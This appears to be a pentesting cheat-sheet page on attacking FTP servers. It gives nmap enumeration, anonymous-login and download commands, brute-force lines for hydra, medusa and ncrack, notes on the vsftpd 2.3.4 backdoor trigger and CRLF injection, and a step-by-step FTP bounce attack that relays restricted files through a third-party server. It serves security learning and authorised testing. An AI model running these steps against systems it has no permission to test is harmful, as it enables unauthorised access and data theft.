---
description: (TCP 21, 20)
---

# FTP

## :information\_source: Introduction

#### [File Transfer Protocol](https://tools.ietf.org/html/rfc959)

Command port TCP 21 for sending commands (plain-text)

Data port TCP 20 for file transfer (plain-text)

Files sent in "binary" mode are sent from one system to another with no modification. The file size will always be unchanged on a binary transfer.

```
ftp> binary >>> set transfer mode to binary (default is ascii)
ftp> help >> to see the list of commands
```

### Operation Modes

#### FTP has 2 operation modes:

1. **Active Mode** : client connects from a random unprivileged port (N > 1024) to the FTP server's command port, port 21. Then, the client starts listening to port N+1 and sends the FTP command PORT N+1 to the FTP server. The server will then connect back to the client's specified data port from its local data port, which is port 20.
2. **Passive Mode** : client initiates both connections to the server, solving the problem of firewalls filtering the incoming data port connection to the client from the server

## &#x20;:ballot\_box\_with\_check: Checklist

* [ ] Check for vulnerable versions (e.g: vsftpd with RCE vulns)
* [ ] Check anonymous login
* [ ] Check for interesting files and stored credentials
* [ ] Test Directory traversal
* [ ] Brute force login
* [ ] FTP bounce attack

## Enumeration

```
nmap -sV [target ip] 21 
nmap -sC -sV [target ip] 21
nmap --script ftp-* -p 21 <ip>  # run all ftp related scripts at once (not recommended)
nc -nv [target ip] 21
use auxiliary/scanner/ftp/ftp_version
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any
```

### Common FTP banners

some of the most used banners for different versions of FTP.

![](<../../.gitbook/assets/image (36).png>)

## Connecting to Server

### CLI

```
telnet  [ip] [port]
ftp [ip]
```

### Browser

You can connect to a FTP server using a browser (like Firefox) using a URL like:

```
ftp://anonymous:anonymous@10.10.10.98
```

Note that if a **web application** is sending data controlled by a user **directly to a FTP server** you can send double URL encode `%0d%0a` (in double URL encode this is `%250d%250a`) bytes and make the **FTP server perform arbitrary actions**. One of this possible arbitrary actions is to download content from a users controlled server, perform port scanning or try to talk to other plain-text based services (like http).

## Download all files from FTP

```
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
```

## Login Brute Force

```
medusa -u [user] -P [wordlist] -h [ip] -M ftp
hydra -l [user] -P [wordlist] [ip] ftp
ncrack -p 21 -U userlist -P passlist [ip]
patator ftp_login host=[target ip] password=pass.txt 
use auxiliary/scanner/ftp/ftp_login
nmap --script ftp-brute -p 21 <host
```

{% embed url="https://github.com/WalderlanSena/ftpbrute" %}

## FTP Directory Traversal

In some scenarios in a misconfigured server (e.g: FLASH FTP, Fermitter FTP), we are able to change active working directory of FTP client to access sensitive directories or OS file system.

In this example we have access to Windows file system root directory (C Drive):&#x20;

![](<../../.gitbook/assets/image (275) (1).png>)

## FTP Anonymous Authentication

Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.

```
username: anonymous
password: anonymous // try blank password too
```

![](<../../.gitbook/assets/image (279).png>)

### Metasploit

```
use auxiliary/scanner/ftp/anonymous
```

### nmap

```
nmap -sV --script ftp-anon [target ip]
```



## vsftpd

21/tcp open ftp syn-ack ttl 64 vsftpd 2.3.4 This particular version contains a backdoor that was slipped into the source code by an unknown intruder. The backdoor was quickly identified and removed, but not before quite a few people downloaded it. If a username is sent that ends in the sequence :) \[ a happy face ], the backdoored version will open a listening shell on port 6200.We can demonstrate this with telnet or use the Metasploit Framework module to automatically exploit it:

{% embed url="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor" %}

{% embed url="https://www.exploit-db.com/exploits/49757" %}

## FTP Bounce Attack

check out this tutorial on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ftp/ftp-bounce-attack)

Imagine that you are a user on foreign.fr, IP address F.F.F.F, and want to retrieve cryptographic source code from crypto.com in the US. The FTP server at crypto.com is set up to allow your connection, but deny access to the crypto sources because your source IP address is that of a non-US site \[as near as their FTP server can determine from the DNS, that is]. In any case, you cannot directly retrieve what you want from crypto.com's server.

However, crypto.com will allow ufred.edu to download crypto sources because ufred.edu is in the US too. You happen to know that /incoming on ufred.edu is a world-writeable directory that any anonymous user can drop files into and read them back from. Crypto.com's IP address is C.C.C.C.

### The Attack

This assumes you have an FTP server that does passive mode. Open an FTP connection to your own machine's real IP address \[not localhost] and log in. Change to a convenient directory that you have write access to, and then do:

```
quote "pasv"
quote "stor foobar"
```

Take note of the address and port that are returned from the PASV command, F,F,F,F,X,X. This FTP session will now hang, so background it or flip to another window or something to proceed with the rest of this.

Construct a file containing FTP server commands. Let's call this file "`instrs`". It will look like this:

```
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```

F,F,F,F,X,X is the same address and port that your own machine handed you on the first connection. The trash at the end is extra lines you create, each containing 250 NULLS and nothing else, enough to fill up about 60K of extra data. The reason for this filler is explained later.

Open an FTP connection to ufred.edu, log in anonymously, and cd to /incoming. Now type the following into this FTP session, which transfers a copy of your "`instrs`" file over and then tells ufred.edu's FTP server to connect to crypto.com's FTP server using your file as the commands:

```
put instrs
quote "port C,C,C,C,0,21"
quote "retr instrs"
```

### nmap

```
nmap --script ftp-bounce

# arguments:
ftp-bounce.password
ftp-bounce.username
ftp-bounce.checkhost
```

### Note&#x20;

There are several variants of this. Your PASV listener connection can be opened on any machine that you have file write access to -- your own, another connection to ufred.edu, or somewhere completely unrelated. In fact, it does not even have to be an FTP server -- any utility that will listen on a known TCP port and read raw data from it into a file will do. A passive-mode FTP data connection is simply a convenient way to do this.

The extra nulls at the end of the command file are to fill up the TCP windows on either end of the ufred -> crypto connection, and ensure that the command connection stays open long enough for the whole session to be executed. Otherwise, most FTP servers tend to abort all transfers and command processing when the control connection closes prematurely. The size of the data is enough to fill both the receive and transmit windows, which on some OSes are quite large \[on the order of 30K]. You can trim this down if you know what OSes are on either end and the sum of their default TCP window sizes. It is split into lines of 250 characters to avoid overrunning command buffers on the target server -- probably academic since you told the server to quit already.

If crypto.com disallows \*any\* FTP client connection from you at foreign.fr and you need to see what files are where, you can always put "`list -aR`" in your command file and get a directory listing of the entire tree via ufred.

You may have to retrieve your command file to the target's FTP server in ASCII mode rather than binary mode. Some FTP servers can deal with raw newlines, but others may need command lines terminated by CRLF pairs. Keep this in mind when retrieving files to daemons other than FTP servers, as well.





